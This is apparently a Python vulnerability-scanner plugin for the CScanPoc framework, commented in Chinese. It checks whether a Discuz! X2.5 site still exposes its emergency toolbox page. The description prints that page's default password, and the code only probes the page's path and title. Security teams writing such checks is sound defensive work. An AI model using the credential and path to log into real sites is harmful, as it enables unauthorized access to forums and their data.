# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time


class Vuln(ABVuln):
    vuln_id = 'Discuz_0004'  # 平台漏洞编号，留空
    name = 'Discuz! X2.5 急诊箱扫描页面弱口令'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-03-24'  # 漏洞公布时间
    desc = '''
        如果急诊箱页面未删除，可能存在默认密码导致被入侵。默认密码：188281MWWxjk.
    '''  # 漏洞描述
    ref = 'https://github.com/heavenK/bbs_new/blob/master/source/plugin/tools/tools.php'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = 'Discuz! X2.5 急诊箱扫描页面'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '136146b3-5429-4606-b5f7-d47df6c09227'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-05'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            verify_url = '%s/source/plugin/tools/tools.php' % self.target

            req = requests.get(verify_url)
            if req.status_code == 200 and '<title>Discuz!' in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
